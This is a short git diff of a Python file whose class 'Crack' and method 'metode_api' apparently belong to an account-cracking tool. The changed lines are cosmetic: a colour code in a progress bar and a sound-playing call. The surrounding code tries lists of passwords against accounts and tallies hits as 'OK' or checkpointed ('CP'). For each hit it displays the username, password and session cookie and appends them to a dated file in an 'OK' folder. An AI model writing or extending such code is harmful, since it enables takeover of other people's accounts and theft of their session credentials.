@@ -477,7 +477,7 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {M2}•{K2}{U2}[IQBALgntg]•{K2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{K2} CP : {M2}{len(self.cp)}{K2}")
+		prog.update(des,description=f" {U2}•{K2}{U2}[IQBALgntg]•{K2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{K2} CP : {M2}{len(self.cp)}{K2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
@@ -519,7 +519,7 @@ class Crack:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 							prints(tree)
-							os.open('play-audio o.mp3')
+							open('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
 						break
 				elif "User must verify their account" in post.text:
